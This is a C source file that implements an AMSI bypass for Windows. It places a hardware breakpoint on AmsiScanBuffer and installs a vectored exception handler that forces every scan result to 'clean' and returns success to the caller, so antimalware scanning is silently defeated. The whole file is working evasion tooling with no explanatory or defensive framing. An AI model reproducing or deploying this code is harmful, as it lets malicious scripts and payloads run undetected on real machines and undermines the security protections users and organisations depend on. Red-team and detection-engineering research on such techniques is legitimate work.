#include "Common.h"

#define AMSI_RESULT_CLEAN 0

// -----------------------
// Globals
// -----------------------

PVOID g_pAmsiScanBuffer = NULL;

// -----------------------
// Helpers
// -----------------------

static ULONG64 SetBits(
    _In_ ULONG64 ullValue,
    _In_ INT     iLowBit,
    _In_ INT     iBits,
    _In_ ULONG64 ullNewValue
)
{
    ULONG64 ullMask = (1ULL << iBits) - 1ULL;
    return (ullValue & ~(ullMask << iLowBit)) | (ullNewValue << iLowBit);
}

static VOID SetHardwareBreakpoint(
    _In_ PCONTEXT pCtx,
    _In_ PVOID    pAddress,
    _In_ INT      iIndex
)
{
    switch (iIndex)
    {
    case 0: pCtx->Dr0 = (ULONG_PTR)pAddress; break;
    case 1: pCtx->Dr1 = (ULONG_PTR)pAddress; break;
    case 2: pCtx->Dr2 = (ULONG_PTR)pAddress; break;
    case 3: pCtx->Dr3 = (ULONG_PTR)pAddress; break;
    }

    // Clear condition/size fields, then enable local breakpoint
    pCtx->Dr7 = SetBits(pCtx->Dr7, 16, 16, 0);
    pCtx->Dr7 = SetBits(pCtx->Dr7, (iIndex * 2), 1, 1);
    pCtx->Dr6 = 0;
}

static VOID ClearHardwareBreakpoint(
    _In_ PCONTEXT pCtx,
    _In_ INT      iIndex
)
{
    switch (iIndex)
    {
    case 0: pCtx->Dr0 = 0; break;
    case 1: pCtx->Dr1 = 0; break;
    case 2: pCtx->Dr2 = 0; break;
    case 3: pCtx->Dr3 = 0; break;
    }

    pCtx->Dr7    = SetBits(pCtx->Dr7, (iIndex * 2), 1, 0);
    pCtx->Dr6    = 0;
    pCtx->EFlags &= ~0x100; // Clear TF to stop single-stepping after resume
}

static ULONG_PTR GetArg(
    _In_ PCONTEXT pCtx,
    _In_ INT      iIndex
)
{
#if defined(_WIN64)
    switch (iIndex)
    {
    case 0: return pCtx->Rcx;
    case 1: return pCtx->Rdx;
    case 2: return pCtx->R8;
    case 3: return pCtx->R9;
    default: return *(ULONG_PTR*)(pCtx->Rsp + ((iIndex + 1) * 8));
    }
#else
    return *(ULONG_PTR*)(pCtx->Esp + ((iIndex + 1) * 4));
#endif
}

static ULONG_PTR GetReturnAddress(
    _In_ PCONTEXT pCtx
)
{
#if defined(_WIN64)
    return *(ULONG_PTR*)pCtx->Rsp;
#else
    return *(ULONG_PTR*)pCtx->Esp;
#endif
}

static VOID SetReturnValue(
    _In_ PCONTEXT  pCtx,
    _In_ ULONG_PTR uValue
)
{
#if defined(_WIN64)
    pCtx->Rax = uValue;
#else
    pCtx->Eax = (ULONG)uValue;
#endif
}

static VOID AdjustStackPointer(
    _In_ PCONTEXT pCtx,
    _In_ INT      iAmount
)
{
#if defined(_WIN64)
    pCtx->Rsp += iAmount;
#else
    pCtx->Esp += iAmount;
#endif
}

static VOID SetInstructionPointer(
    _In_ PCONTEXT  pCtx,
    _In_ ULONG_PTR uAddress
)
{
#if defined(_WIN64)
    pCtx->Rip = uAddress;
#else
    pCtx->Eip = (ULONG)uAddress;
#endif
}

// -----------------------
// Exception Handler
// -----------------------

// Intercepts AmsiScanBuffer, forces AMSI_RESULT_CLEAN, redirects to caller
LONG WINAPI AmsiExceptionHandler(
    _In_ PEXCEPTION_POINTERS pExceptions
)
{
    ULONG_PTR uReturnAddress = 0;
    INT*      pScanResult    = NULL;

    if (pExceptions->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP ||
        pExceptions->ExceptionRecord->ExceptionAddress != g_pAmsiScanBuffer)
    {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    uReturnAddress = GetReturnAddress(pExceptions->ContextRecord);
    pScanResult    = (INT*)GetArg(pExceptions->ContextRecord, 5);
    *pScanResult   = AMSI_RESULT_CLEAN;

    SetInstructionPointer(pExceptions->ContextRecord, uReturnAddress);
    AdjustStackPointer(pExceptions->ContextRecord, sizeof(PVOID));
    SetReturnValue(pExceptions->ContextRecord, (ULONG_PTR)S_OK);
    ClearHardwareBreakpoint(pExceptions->ContextRecord, 0);

    return EXCEPTION_CONTINUE_EXECUTION;
}

// -----------------------
// Functions
// -----------------------

HANDLE SetupAmsiBypass(VOID)
{
    CONTEXT threadCtx  = { 0 };
    HMODULE hAmsi      = NULL;
    HANDLE  hExHandler = NULL;

    if (g_pAmsiScanBuffer == NULL)
    {
        hAmsi = GetModuleHandleA("amsi.dll");

        if (hAmsi == NULL)
            hAmsi = LoadLibraryA("amsi.dll");

        if (hAmsi == NULL)
            return NULL;

        g_pAmsiScanBuffer = (PVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");

        if (g_pAmsiScanBuffer == NULL)
            return NULL;
    }

    hExHandler = AddVectoredExceptionHandler(1, AmsiExceptionHandler);

    threadCtx.ContextFlags = CONTEXT_ALL;

    if (GetThreadContext((HANDLE)-2, &threadCtx))
    {
        SetHardwareBreakpoint(&threadCtx, g_pAmsiScanBuffer, 0);
        SetThreadContext((HANDLE)-2, &threadCtx);
    }

    return hExHandler;
}
